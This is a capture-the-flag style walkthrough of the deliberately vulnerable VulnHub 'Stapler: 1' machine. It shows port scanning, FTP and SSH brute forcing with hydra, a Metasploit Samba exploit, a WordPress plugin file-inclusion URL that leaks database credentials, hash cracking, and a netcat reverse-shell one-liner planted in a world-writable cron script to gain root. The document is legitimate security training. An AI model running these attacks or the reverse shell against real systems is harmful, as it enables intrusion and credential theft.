# Stapler: 1
[VulnHub link](https://www.vulnhub.com/entry/stapler-1,150/)  
By g0tmi1k

* We are first greeted with a login page that requires users to specify both the username and the password:
![](/screenshots/stapler/loginInitial.jpg)
* Common login credentials such as `admin:admin` and `admin:password` do not work. Also, not exactly sure why the initial login prompt and the one after an attempted login is different.
* Run `nmap 10.0.2.*`, where we find 5 live hosts:
![](/screenshots/stapler/nmapScan.jpg)
* After eliminating our own IP address and our router gateway IP address, it is very likely that the vulnerable VM's IP address is `10.0.2.18`.
* The host is running 7 services, where all of the listed ports below are open:
1. FTP at port 21
2. SSH at port 22
3. Domain at port 53
4. HTTP at port 80
5. NetBIOS-SSN at port 139
6. Doom at port 666
7. MySQL at port 3306
* There is also a closed port 20 that was running FTP-data service.
* This is our first walkthrough with so many services and ports open, probably because that there are multiple ways to get a limited shell and root access as mentioned by the author.
* Run `nmap -p- -A 10.0.2.18`:
![](/screenshots/stapler/hostFullScan.jpg)
* The scan results turned out to be really long because of the many services running.

# FTP at Port 21
* This entire section of FTP would very much likely to be brand new to me because the only time we touched on it (barely) was in `basic-pentesting-1` where we simply used a metasploit module to elevate ourselves from an unauthenticated status to a root user.
* Our `nmap` scan results showed that anonymous FTP login is allowed, and from this [article](https://shahmeeramir.com/penetration-testing-of-an-ftp-server-19afe538be4b), I found out that we can search for anonymous login permissions using this metasploit exploit:
1. `msfconsole`
2. `use auxiliary/scanner/ftp/anonymous`
3. `set rhosts 10.0.2.18`
4. `exploit`
![](/screenshots/stapler/ftpAnonymous.jpg)
* While we managed to find out that we have `READ` permissions, we did not manage to find out the vsFTPd (Very Secure File Transfer Protocol Daemon) version. The banner information was deliberately replaced with a custom message. Our `nmap` scan only told us that the version is `2.0.8` or later.
* Nonetheless, the FTP server status section under the scan did state `vsFTPd 3.0.3 - secure, fast, stable`.
* Logging into a FTP server with `ftp 10.0.2.18`, using the credentials `anonymous:anonymous`:
![](/screenshots/stapler/ftpLoginAnonymous.jpg)
* Note: Logging into a FTP server differs from that of a SSH server, i.e. we cannot run `ftp <username>@10.0.2.18`.
* `ls -al` shows us all of the files that are in the current directory, where we can find a file `note`. Turns out that `cat` does not work in FTP, and I found out that we had to use `get note` to download the file to our Kali VM:
![](/screenshots/stapler/ftpNoteFile.jpg)
* There is a message to Elly and John within `note` - not sure what it means at this point in time.
* For the next part, it appears that we have to do a dictionary attack to get a set of FTP credentials, and our dictionary wordlist would be derived by enumerating NetBIOS-SSN Samba SMBD at port 139 (see section on this below).
* We will run `hydra -L formattedwordlist.txt -P formattedwordlist.txt 10.0.2.18 ftp`:
![](/screenshots/stapler/ftpHydra.jpg)
* Note: Not sure how we would know to use the same wordlist as both username and password, because that does not seem like an intuitive thought - I would have thought that it would be too easy. But nonetheless, I will be trying out the same wordlist for both the username and password wordlist, moving forward.
* We managed to obtain 1 set of credentials: `SHayslett:SHayslett`.
* Next, let us login to the FTP server again with our set of credentials:
![](/screenshots/stapler/ftpLoginSHayslett.jpg)
* There is a long list of files in the current user's directory.
* I was not quite sure of what to look out for initially in this long list - however, on hindsight, `apache2` is definitely noteworthy. That's the web server!

# OpenSSH at Port 22
* Interestingly, an attempted login here reveals a banner that I did not expect.
![](/screenshots/stapler/sshBanner.jpg)
* From this, we can deduce that it is very likely that there is a username `barry` in addition to `root`.
* I tried to use the `formattedwordlist.txt` from the results of `enum4linux` as the password list for a `hydra` attack, together with `barry` and `root` as the username list, but to no avail.
* Okay, so trying out `hydra -L formattedwordlist.txt -P formattedwordlist.txt 10.0.2.18 ssh` revealed the same set of credentials, `SHayslett:SHayslett`:
![](/screenshots/stapler/sshHydra.jpg)
* Again, it is interesting how the username and the password is the same.
* Logging in as `SHayslett`:
![](/screenshots/stapler/sshLoginSHayslett.jpg)
* Next, run `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we can possibly exploit:
![](/screenshots/stapler/setuidBinaries.jpg)
* Trying to list the allowed commands for `SHayslett` is forbidden:
![](/screenshots/stapler/allowedCommandsSHayslett.jpg)
* I did not know that such a restriction was possible, as we had always been successfully running this command when logged in as a user besides `www-data`.
* At this point in time, I had already attempted to access the web servers (see below), but could not manage to find any useful information. So let us go to `/var/www/https`:
![](/screenshots/stapler/webServerDirectoryContents.jpg)
* Opening up `custom_400.html`, we see that it is the page that had been greeting us (with status code 400).
* There is also an `index.html`, which states `Internal Index Page!`.
* The next file of interest is `robots.txt`, which states `Disallow: /admin112233/` and `Disallow: /blogblog/`. These 2 directories contain the web server files which we discover from another set of enumeration.
* This is probably the file that resulted in the additional response header about Dave:
![](/screenshots/stapler/htAccess.jpg)
* Navigating to the `/tmp` directory, I ran [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py), which gave us a whole chunk of information.
* According to ``, a noteworthy piece of information is found in the section on `World Writable Files`, where the file `/usr/local/sbin/cron-logrotate.sh` has rwx permissions for all.
* Opening up the `.sh` file shows us only a line of comment code, telling "Simon that he needs to do something about this". This reinforces the fact that we are looking at the right file - the person who put in this message for Simon probably realised what a malicious person can do with this.
![](/screenshots/stapler/cronLogRotateScript.jpg)
* Insert `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.4 1234 >/tmp/f` into `cron-logrotate.sh`, and run `nc -v -l -p 1234` on our Kali VM.
* Note: The one-liner that was inserted is taken from a [cheat sheet on reverse shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
* Note2: I thought of trying something simpler for the one-liner, but the `nc` running is from the `netcat-openbsd` package, which required something different:
![](/screenshots/stapler/netcatVariant.jpg)
* Several minutes later, we have a shell! Run `python -c 'import pty; pty.spawn("/bin/bash")'` to get our interactive TTY shell and `export TERM=xterm` to enable commands such as `clear` for our convenience:
![](/screenshots/stapler/reverseShell.jpg)
* Head to `/root` directory, and open `flag.txt`.
![](/screenshots/stapler/rootDirectoryContentsColoured.jpg)
* Fun-fact: Getting the flag this way adds colour to the directory content listing, versus getting it through exploiting Samba.

# NetBIOS-SSN Samba SMBD at Port 139
* This is even newer to me than FTP, with my only knowledge about this being that ports 137 to 139 are used for NetBIOS (Network Basic Input/Output System).
* We will use `enum4linux` here: `enum4linux 10.0.2.18`. The screenshot below only shows the information that we will be extracting from the scan, i.e. a wordlist:
![](/screenshots/stapler/enum4linuxPartialResults.jpg)
* Note: `enum4linux` is a tool for "enumerating data from Windows and Samba hosts".
* Copy and paste the relevant result lines and paste it into a text file (e.g. `wordlist.txt`).
* Next, run `cat wordlist.txt | cut -d '\' -f2 | cut -d ' ' -f1 > formattedwordlist.txt` to just extract the dedicated string on each line, i.e. removing all redundant information.
* Interesting to learn of `cut` - my first encounter with it. The command will first remove the redundant information in the prefix, before cleaning the suffix.
* Note: `-d` is the delimiter. `-f` is the field, where the first field is `S-1-22-1-1029` as an example. Each field is separated with a whitespace (my guess after trial-and-error).
* The wordlist is very small, with only 30 lines:
![](/screenshots/stapler/wordlistFromNetBIOS.jpg)
* We will then use this wordlist to attack for a set of FTP credentials (see section on FTP at port 21).
* `searchsploit samba` gives us a list of results:
![](/screenshots/stapler/searchsploitSamba.jpg)
* Since the Samba version that we are working with is `4.3.9`, the only one that stood out is `'is_known_pipename()' Arbitrary Module Load`.
* Heading to `msfconsole`, `search samba` reveals a shorter list, where we will `use exploit/linux/samba/is_known_pipename`.
![](/screenshots/stapler/msfconsoleSearchSamba.jpg)
* Set `RHOSTS` to the IP address of the vulnerable VM, and `RPORT` to 139:
![](/screenshots/stapler/msfconsoleOptionsSamba.jpg)
* Note: I had always thought that SMB would be run on port 445, but here it is on 139 with NetBIOS (**find out how this works**).
* And we are now `root`!
![](/screenshots/stapler/msfconsoleExploitSamba.jpg)
* Run `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn our interactive TTY shell.
* Head to `/root` directory, and we find `flag.txt`:
![](/screenshots/stapler/rootDirectoryContents.jpg)
* Here is our flag:
![](/screenshots/stapler/flag.jpg)
* The string at the end of the file `b6b545dc11b7a270f4bad23432190c75162c4a2b` is a hash, but running it on online hash crackers do not yield anything.
![](/screenshots/stapler/flagHash.jpg)

# Web Server at Port 80 and 12380
* Visiting `http://10.0.2.18` results in a Not Found error. It appears to be a PHP client server running at port 80:
![](/screenshots/stapler/siteWebServer.jpg)
* We had also found another web server running at port 12380 during our second, in-depth `nmap` scan. An Apache web server of version `2.4.18` is running at this port.
* Visiting `http://10.0.2.18:12380` results in proper site loading:
![](/screenshots/stapler/siteWebServerReal.jpg)
* It seems like there is only the default page available, because trying to load a random, non-existent section of the page resulted in the same page displayed. Same result when trying to load a file like `robots.txt`.
* The website is built by `Creative Tim`.
* I decided to try out `gobuster` instead of `dirbuster` considering its many positive reviews that I had found about it, to do a dictionary attack on the URIs (directories and files) on both web servers: `gobuster -e -u http://10.0.2.18:<PortNumber>/ -w /usr/share/wordlists/dirb/common.txt`.
![](/screenshots/stapler/gobusterResults.jpg)
* Note: `-e` lists the full path of the directory or file that is discovered.
* It turns out that we can find the `.bashrc` and `.profile` files for the web server running on port 80 - but they do not seem to reveal anything of interest.
* Running `whatweb` on port 80 did not yield any useful results, but we find the status code of `400 Bad Request` and an extra HTTP header as part of the response for the latter port:
![](/screenshots/stapler/whatweb12380.jpg)
* According to what I found from Google, a Bad Request is due to our invalid request that the server is unable to process.
* Not sure if it is due to my knowledge gap or if it is truly something that I had missed, but I do not seem to be able to find anything wrong in the request headers.
* I had also tried to send only the first 2 lines of the original request, which contains only the GET request and the host address (in case any of the other headers were invalid), but to no avail.
* **Continuation**: It turns out that running `nikto` would have told us what we needed to know to proceed forward! Run `nikto -h 10.0.2.18:12380`:
![](/screenshots/stapler/niktoScan12380.jpg)
* Note: `nikto` is a web server scanner. I knew the existence of such a scanner but I had always thought that I could get away with existing tools that were already doing a great job, based on what I had experienced in the previous challenges. Hence, my lesson here is that our usual tools of `gobuster` and `dirbuster` is not enough. `-h` specifies the host.
* The part that screams out is actually the first result of the scan - `SSL Info`. We see later on that `The site uses SSL` appears twice. Putting two and two together, this means that we need to access the web server on port 12380 with `https`!
* Another noteworthy piece of information from the scan results is the existence of `/phpmyadmin`.
* Accessing `https://10.0.2.13:12380`:
![](/screenshots/stapler/siteWebServer12380.jpg)
* Now before we actually see the page above that states `Internal Index Page!`, when accessing the site for the first time using https, we need to accept a certificate (click `Add Exception`):
![](/screenshots/stapler/certificate12380.jpg)
* Remember what we saw under the `SSL Info` section of our `nikto` scan? They are actually information found within the certificate.
* Having arrived at a vanilla page (whose page source is only the one-liner that greets us), we can look back at our `nikto` scan for clues on where we should search next. There are 2 entries, `/admin112233/` and `/blogblog/`. These 2 results are the same ones as what was derived earlier in SSH, except that at that point in time, I could not manage to access these 2 sites because of not knowing about `https`.
* Let us explore `https://10.0.2.18:12380/admin112233` first:
![](/screenshots/stapler/admin112233PopUp.jpg)
* The first thing that we see upon visiting the site is a pop-up that says `This could of been a BeEF-XSS hook ;)`. I recognise the term `XSS`, but not `BeEF`. It turns out that `BeEF` means Browser Exploitation Framework Project, which "is a security tool, allowing a penetration tester or system administrator additional attack vectors when assessing the posture of a target", according to [beefproject](https://beefproject.com/).
* After that, we are re-directed to `http://www.xss-payloads.com/`.
* Visiting `https://10.0.2.18:12380/blogblog` brings us to a WordPress blog whose contents are about the office life of Initech:
![](/screenshots/stapler/blogblogLandingPage.jpg)
* Note: We recognise that it is a WordPress site based on what we see being stated right at the bottom of the page: `Proudly powered by WordPress`.
* I headed to the login page at `/wp-login.php`, and ran `hydra -L usernames.txt -P formattedwordlist.txt -S -s 12380 10.0.2.18 http-form-post '/blogblog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Dashboard'`:
* `usernames.txt` consists of:
1. `harry`: FTP banner
2. `barry`: SSH banner
3. `elly`: `note` file in `anonymous` FTP login
4. `john`: `note` file in `anonymous` FTP login
* The formatted wordlist text file was taken earlier from the `enum4linux` scan.
* `-S` allows us to connect via SSL and `-s` allows us to specify our port number, since it is running on a different default port (80).
* Note: Include a `-V` to see the failed attempts to make sure it is going right (if you would like). The first time I ran the tool, I did it without connecting via SSL and each login attempt took years.
* Unfortunately, while we could identify 4 valid usernames, we are unable to get a login on any of them with `hydra`.
* Run `wpscan --url https://10.0.2.18:12380/blogblog --enumerate u --disable-tls-checks` to see if we can find out any other valid usernames:
![](/screenshots/stapler/wpscanUsersResults.jpg)
* That was a pretty long list - there are a total of 10 usernames that we have now.
* Note: The `--disable-tls-checks` option is something new - running the command without the option results in the error where it says `SSL peer certificate or SSH remote key was not OK`. Remember we had to manually add an exception by accepting a certificate when we first visited the site? This tool probably encountered the same thing, but did not know how to navigate around it without the additional option.
* Note2: Looking at the other walkthroughs, it appears that the option was not necessary for them. **Hmm.**
![](/screenshots/stapler/wpscanUsersResultsError.jpg)
* **Continuation**: On hindsight, one of these posts actually gave a big hint on the identity of 2 users. If we were to start cracking any account, we should focus on getting that of user `john`, since he "runs the place".
* We would also focus our efforts on user `vicki`, since she "sorted out WordPress plugins". Note that `vicki` did not show up on our earlier efforts to enumerate users, but I realised that this account exists by manually trying it out via the login page. +1 to the user list.
* Also, there is also a hint here that we should look into enumerating plugins, and see if there are any vulnerabilities that can get us in.
![](/screenshots/stapler/wordPressUserIdentityHints.jpg)
* We retry the same `hydra` command that we had run earlier, but to no avail.
* Let us next take a look at the other results of `wpscan --url https://10.0.2.18:12380/blogblog --disable-tls-checks`.
* The first result that got our interest is the presence of `readme.html`. Both the file and the `wpscan` result said that the running WordPress version is `4.2.1`, which has apparently got 64 vulnerabilities.
![](/screenshots/stapler/wordPressVersion.jpg)
* The theme used is `bhost`, which I have never seen before. No plugins were detected.
* I read up that our normal `wpscan` execution may not run (sufficient) checks to detect plugins, and that we had to specifically set an option to enumerate them. Run `wpscan --url https://10.0.2.18:12380/blogblog --enumerate ap --disable-tls-checks`, where `ap` means all plugins.
* However, I got the same result that **No plugins Found.**. Hmm - this contradicts what the hint given above, as well as with the accounts of other walkthroughs that I read...
* Nonetheless, another finding from our `wpscan` would lead us to find the plugins through another way, through `directory listing` (since it is enabled):
![](/screenshots/stapler/wordPressListingEnabled.jpg)
* Opening the given `https://10.0.2.18:12380/blogblog/wp-content/uploads/`, we navigate one directory up, and notice that there are 3 directories: `plugins`, `themes` and `uploads`.
* Clicking into `plugins` shows us the 3 plugins:
![](/screenshots/stapler/wordPressListingPlugins.jpg)
* Googling for `advanced-video-embed-embed-videos-or-playlists exploit` leads us to [WordPress Plugin Advanced Video 1.0 - Local File Inclusion](https://www.exploit-db.com/exploits/39646) on Exploit DB.
* Reading the `readme.txt` file shows that the running version is `1.0` - looks like we have found something that could work!
![](/screenshots/stapler/advancedVideoPluginVersion.jpg)
* Create `39646.py` which contains the exact contents from the Exploit DB page. The only modification which we need is the line where we assign our url string to variable `url` - change it accordingly. Mine is: `url = "https://10.0.2.18:12380/blogblog"`.
* Next, run it with `python 39646.py`:
![](/screenshots/stapler/pluginExploitFailed.jpg)
* The error is related to SSL and its certificate. Whatever we did above had to cater to the HTTPS consideration, and so would this step.
* Googling about this error leads us to [this StackOverflow post](https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error) which tells us how we can resolve this error.
* Add `import ssl` then `ssl._create_default_https_context = ssl._create_unverified_context` to `39646.py`, at the end of the 3 import statements. Run `39646.py`, which should display no output.
* Note: These 2 additional lines are known as `monkey patches` according to the StackOverflow post - interesting to learn that this term refers to ways to extend/modify software for local purposes.
* **Alternatively**, instead of all of the hassle above, just refer to the line of comment in the code which says `POC`, and modify the URL accordingly before running it in the browser. Mine would be `https://10.0.2.18:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php`. If you see some one-liner input like this, it is done:
![](/screenshots/stapler/pluginExploitShortMethod.jpg)
* Fun-fact: I ran the same page several times, and watched the `p=` value increase by 20 each time.
* Heading to `https://10.0.2.18:12380/blogblog/wp-content/uploads/`, we see that the originally empty directory has got `.jpeg` files inside now.
* Run `wget https://10.0.2.18:12380/blogblog/wp-content/uploads/1325939172.jpeg --no-check-certificate` to download the image:
![](/screenshots/stapler/wgetImage.jpg)
* Note: Again, running without an additional option here `--no-check-certificate` would result in an error because of HTTPS:
![](/screenshots/stapler/wgetImageError.jpg)
* Having successfully downloaded the `.jpeg` file, we would expect it to be a text file, so run `cat` to see the contents, and we have now got the MySQL database credentials `root:plbkac`!
![](/screenshots/stapler/mySQLDatabaseCredentials.jpg)
* The exploit code stated the file `wp-config.php` as the one that we would like to obtain, which is why we managed to get the database credentials. There are other files that we can get as well, such as `/etc/passwd`.
* How the exploit worked: I am not entirely sure how this plugin works, since its official WordPress link does not reveal any details - it has already been closed. But I suppose that the idea is that it creates an unauthenticated post, and publishes it, with the `.jpeg` file being attached to the post as well. However, it does not load as an image because it is a text file instead.
* This is what we see at the main page of the WordPress site - I had executed the exploit code several times:
![](/screenshots/stapler/wordPressUnauthenticatedPosts.jpg)
* I felt that the toughest part for me here was figuring out where the `.jpeg` file is stored. I know that things would not be as straightforward as simply running the exploit code because the output was blank. Granted, I knew that the exploit code would publish a post, since I saw `publishPost`. However, going to the post or the homepage did not reveal to us the location of the `.jpeg` file. I suppose that we would have to **link our previous discovery of the uploads directory to this exploit to find the jpeg files**.
* Let us now head to the section on MySQL since we have got a set of credentials from this plugin exploit.
* Failed attempt: `use auxiliary/scanner/http/apache_optionsbleed` on `msfconsole` (where this version of Apache HTTP server is affected by).
* Failed attempt: `use exploit/multi/http/wp_crop_rce` on `msfconsole` (which this version of WordPress is affected by; the IP address is different in the screenshot because it was tested on another machine):
![](/screenshots/stapler/failed_wp_crop_rce.jpg)

# Doom at Port 666
* Visiting `http://10.0.2.18:666/` (running service Doom, which I have no idea what it truly is) results in a page displaying unreadable information:
![](/screenshots/stapler/portDoom.jpg)
* `wget http://10.0.2.18:666` allows us to download a local copy of the file, where `file` tells us that it is a .zip file.
![](/screenshots/stapler/file666.jpg)
* I found out from `windsorwebdeveloper` that `PK` at the beginning of the file is a sign that it is a zip file.
* `unzip index.html` gives us `message2.jpg`. Running `file` confirms that it is a JPEG file.
![](/screenshots/stapler/unzip666.jpg)
* Opening `message2.jpg` shows us:
![](/screenshots/stapler/file666Message2.jpg)
* It seems like there is a buffer overflow taking place when the second statement was echoed, since the first echo statement did exactly what was expected - echoing the user input's statement. However, the second string's length was probably too long.
* I would have totally left this out, but running `strings` on the jpg file also gave us additional information (about a cookie):
![](/screenshots/stapler/file666Message2Strings.jpg)
* Conclusion: Hmm, nonetheless, I suspect this entire port and service was to just throw us off the main path.

# MySQL at Port 3306
* Research: Running on version `5.7.12-0ubuntu1`, I found an [exploit](https://www.exploit-db.com/exploits/40679) that would work on it, provided that we could get credentials to a system account.
* Research: This [article](https://robert.penz.name/1416/how-to-brute-force-a-mysql-db/) shows us how we can do a dictionary attack using `hydra`.
* Having derived a set of credentials `root:plbkac` from exploiting a vulnerable WordPress plugin, we will now login with the command `mysql -h 10.0.2.18 -u root -pplbkac`.
![](/screenshots/stapler/mySQLLogin.jpg)
* `show databases;` reveals to us several databases:
![](/screenshots/stapler/mySQLDatabases.jpg)
* The `loot` database looks interesting, so run `use loot` and `show tables;` to see what tables there are within the database. However, turns out that the information is probably just Initech company's information.
![](/screenshots/stapler/mySQLlootDatabase.jpg)
* The next most interesting database would be `wordpress`. Naturally, we would look into the `wp_users` table with `select * from wp_users;`:
![](/screenshots/stapler/mySQLUsersTable.jpg)
* We see a list of 16 users with their password hashes respectively - a number that is higher than what we derived based on `wpscan` and our clues gathering previously.
* Also, this list of information also strengthens our guess that `john` is an Administrator, given that his account was registered earlier than any of the other accounts.
* Running `hash-identifier` against one of the hashes shows us that it is a MD5 WordPress hash - interesting. This is the first time that we are encountering a variant of the MD5 hash.
![](/screenshots/stapler/hashIdentifierMD5WordPress.jpg)
* Using `hashcat`, we are able to the password of user `john` within about 2.5 minutes: `incorrect`. Run `hashcat -m 400 crackThisHash.txt /usr/share/wordlists/rockyou.txt --force`:
![](/screenshots/stapler/hashcatJohnPasswordHash.jpg)
* Note: The same command was used in `dc-3`, with the exception that we are using hash type 400 here, which encompasses `phpass, MD5(Wordpress), MD5(phpBB3), MD5(Joomla)`.
* I found out that the word `incorrect` is in `rockyou.txt`, but using `hydra -l john -P/usr/share/wordlists/rockyou.txt -S -s 12380 10.0.2.18 http-form-post '/blogblog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Dashboard'` to get user `john` credentials would take way too long.
* Logging in to the WordPress admin panel with `john:incorrect` shows us a customised version of it (the usual ones that we see are for example, styled in blue):
![](/screenshots/stapler/wordPressAdminPage.jpg)
* I had thought of inserting the php-reverse-shell code into a plugin/themes file, but instead of seeing the button to save changes, we see `You need to make this file writable before you can save your changes.` instead. Cool - this is something new for me.
* Since we are unable to edit the files of an existing plugin, I thought of uploading our reverse shell by adding a new plugin, but encountered this page which required **FTP credentials** as part of connection information.
![](/screenshots/stapler/installPluginMessage.jpg)
* I entered `SHayslett:SHayslett`, which we had found earlier, but to no avail. (Interestingly, in `Kan1shka9`'s walkthrough, the author was able to upload the php-reverse-shell PHP file successfully - it is not even a .zip file)
![](/screenshots/stapler/installPluginFailed.jpg)
* The mention of FTP brought me back to our directory listing finding as user `SHayslett` - indeed there is an `apache2` folder in it!

# To-Explore
* Since the certificate's Common Name is `Red.Initech`, we will add one entry in the `/etc/hosts` file - `10.0.2.18 red.initech`. (Note: case insensitive in this case)
![](/screenshots/stapler/hostsFile.jpg)
* Instead of logging in to phpMyAdmin to replace hash value, can just use mySQL?

# Concluding Remarks
Encountering a vulnerable machine with so many services makes things more challenging in my opinion because there appears to be so many attack vectors that we can target. I learnt tremendously from going through this exercise several times, and examining all the various attack vectors in detail.

1. Learnt to stay focus on one at a time eventually, because I was all-over-the-place at the beginning.
2. Learnt how to access FTP and how it works.
3. Learnt about enumerating NetBIOS and Samba at port 139 and how it works.
4. Learnt to use `linuxprivchecker` (I had always wondered how I could run it - and somehow neglected to think of the `/tmp` directory)
5. Learnt how to use tools with the SSL option (e.g. `hydra` and `wget`).

# References
1. https://download.vulnhub.com/stapler/slides.pdf
2. https://medium.com/@Kan1shka9/stapler-1-walkthrough-e1f2a667ea4
3. https://windsorwebdeveloper.com/stapler-1-vulnhub-walkthrough/